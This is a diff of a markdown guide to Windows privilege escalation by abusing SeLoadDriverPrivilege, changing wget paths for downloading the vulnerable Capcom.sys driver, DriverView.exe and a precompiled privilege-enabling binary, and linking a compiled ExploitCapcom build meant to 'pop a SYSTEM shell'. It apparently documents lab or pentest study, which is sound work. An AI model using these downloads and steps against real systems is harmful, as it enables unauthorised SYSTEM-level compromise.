@@ -61,7 +61,7 @@ If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivile
 **2.** Compiling `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 
 
 ```
-# Go to https://github.com/amandaguglieri/Privescalation/tree/main/tools/enabling-privileges and access to the .cpp files. In the case of EnableSeLoadDriverPrivilege.cpp, download it
+# Go to https://github.com/amandaguglieri/Privescalation/tree/main/EnablePrivilegeScripts/enable-priv-tools and access to the .cpp files. In the case of EnableSeLoadDriverPrivilege.cpp, download it
 
 
 # Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
@@ -84,10 +84,13 @@ cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
 
 ```
 # Download Capcom.sys
-wget https://github.com/amandaguglieri/Privescalation/blob/main/tools/enabling-privileges/releases/Capcom.sys
+wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/Capcom.sys
 
 # Download DriverView.exe
-wget https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe
+wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/DriverView.exe
+
+# I added in the resouces folder also the compiled version of the EnableSeLoadDriverPrivilege.exe
+wget https://github.com/amandaguglieri/Privescalation/blob/main/EnablePrivilegeScripts/enable-priv-tools/releases/EnableSeLoadDriverPrivilege.exe
 ```
 
 **4.** Serve the files to the target host:
@@ -262,7 +265,7 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
 
 
-We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.
+We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary. [See my compiled version](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeLoadDriverPrivilege/releases).
 
 ## Clean-up
 
